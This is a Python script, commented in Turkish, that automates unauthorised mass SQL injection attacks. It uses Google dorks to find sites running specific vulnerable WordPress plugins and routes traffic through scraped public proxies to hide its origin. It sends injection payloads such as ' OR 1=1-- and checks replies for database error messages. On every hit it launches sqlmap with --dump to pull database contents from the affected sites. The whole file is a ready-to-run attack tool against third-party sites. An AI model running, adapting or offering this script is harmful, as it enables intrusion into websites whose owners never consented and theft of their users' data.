import requests
import threading
import time
import random
import os
import subprocess
from googlesearch import search
from colorama import Fore, Style, init

# Colorama başlat
init(autoreset=True)

def proxyleri_cek():
    print(Fore.BLUE + "🔄 Proxy listesi çekiliyor...")
    try:
        response = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all')
        if response.status_code == 200:
            proxies = response.text.strip().split('\n')
            proxy_list = [f"http://{proxy.strip()}" for proxy in proxies if proxy.strip()]
            print(Fore.GREEN + f"✅ {len(proxy_list)} adet proxy bulundu.")
            return proxy_list
        else:
            print(Fore.RED + "❌ ProxyScrape erişim hatası!")
            return []
    except Exception as e:
        print(Fore.RED + f"❌ Proxy çekme hatası: {e}")
        return []

# Kullanılacak Dorklar (WordPress Plugin hedefli)
dorklar = [
    'inurl:"wp-content/plugins/wp-statistics/"',
    'inurl:"wp-content/plugins/wp-symposium/"',
    'inurl:"wp-content/plugins/revslider/"',
]

# SQL Injection payloadları
payloadlar = [
    "'",
    "''",
    "-1' OR '1'='1",
    "' OR 1=1-- "
]

# Sonuç klasör ve dosya ayarları
results_dir = "results"
sqlmap_output_dir = os.path.join(results_dir, "sqlmap_outputs")

if not os.path.exists(results_dir):
    os.makedirs(results_dir)
if not os.path.exists(sqlmap_output_dir):
    os.makedirs(sqlmap_output_dir)

vulnerable_sites_path = os.path.join(results_dir, "vulnerable_sites.txt")
possible_sites_path = os.path.join(results_dir, "possible_sites.txt")
tried_sites_path = os.path.join(results_dir, "tried_sites.txt")

vulnerable_sites = open(vulnerable_sites_path, "a", encoding="utf-8")
possible_sites = open(possible_sites_path, "a", encoding="utf-8")

if os.path.exists(tried_sites_path):
    with open(tried_sites_path, "r", encoding="utf-8") as f:
        tried_sites = set(f.read().splitlines())
else:
    tried_sites = set()

lock = threading.Lock()

proxy_secimi = input(Fore.YELLOW + "🔵 Proxy ile tarama yapmak ister misin? (y/n): ").lower()

use_proxy = False
proxy_list = []

if proxy_secimi == "y":
    proxy_list = proxyleri_cek()
    if proxy_list:
        use_proxy = True
    else:
        print(Fore.RED + "⚠️ Proxy listesi boş geldi. Proxysiz devam edilecek.")
else:
    print(Fore.BLUE + "➡️ Proxy kullanılmadan doğrudan tarama yapılacak.")

print(Fore.MAGENTA + "\n🚀 Tarama Başladı (Proxy Durumu: {})...\n".format("Açık" if use_proxy else "Kapalı"))

# SQLmap başlatan fonksiyon
def sqlmap_baslat(url):
    print(Fore.CYAN + f"🧠 SQLmap başlatılıyor: {url}")
    filename = url.replace("http://", "").replace("https://", "").replace("/", "_").replace("?", "_")
    output_path = os.path.join(sqlmap_output_dir, f"{filename}.txt")

    try:
        with open(output_path, "w", encoding="utf-8") as outfile:
            subprocess.Popen([
                "sqlmap",
                "-u", url,
                "--batch",
                "--dump",
                "--random-agent"
            ], stdout=outfile, stderr=outfile)
        print(Fore.GREEN + f"📄 SQLmap çıktısı kaydedildi: {output_path}")
    except Exception as e:
        print(Fore.RED + f"❌ sqlmap çalıştırılamadı: {e}")

# Siteyi test eden fonksiyon
def test_site(site):
    if site in tried_sites:
        print(Fore.YELLOW + f"⏩ Zaten denenmiş site, atlanıyor: {site}")
        return

    print(Fore.BLUE + f"🎯 Tarama yapılıyor: {site}")

    for payload in payloadlar:
        test_url = site
        if "?" in site:
            test_url += payload
        else:
            test_url += "?" + payload

        try:
            if use_proxy:
                proxy = {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}
                res = requests.get(test_url, timeout=10, proxies=proxy)
            else:
                res = requests.get(test_url, timeout=10)

            if any(error in res.text.lower() for error in [
                "sql syntax", "mysql_fetch", "syntax error", "warning: mysql"
            ]):
                print(Fore.GREEN + f"🔥 SQL Injection bulundu: {test_url}")
                with lock:
                    vulnerable_sites.write(test_url + "\n")
                sqlmap_baslat(test_url)
                break
            elif res.status_code >= 500:
                print(Fore.YELLOW + f"⚡ Şüpheli server hatası: {test_url}")
                with lock:
                    possible_sites.write(test_url + "\n")
                break
        except Exception as e:
            print(Fore.RED + f"⚠️ İstek başarısız: {e}")
        time.sleep(2)

    with lock:
        with open(tried_sites_path, "a", encoding="utf-8") as f:
            f.write(site + "\n")
        tried_sites.add(site)

# Dorklarla site arama ve tarama başlatma
for dork in dorklar:
    print(Fore.CYAN + f"🔎 Dork aranıyor: {dork}\n")
    try:
        siteler = search(dork, num_results=10, lang="en")
        threads = []
        for site in siteler:
            t = threading.Thread(target=test_site, args=(site,))
            t.start()
            threads.append(t)
            time.sleep(1)

        for t in threads:
            t.join()

    except Exception as e:
        print(Fore.RED + f"🔴 Dork arama hatası: {e}")
    time.sleep(10)

vulnerable_sites.close()
possible_sites.close()

print(Fore.GREEN + "\n✅ Tarama tamamlandı. Sonuçlar 'results/' klasörüne kaydedildi.")
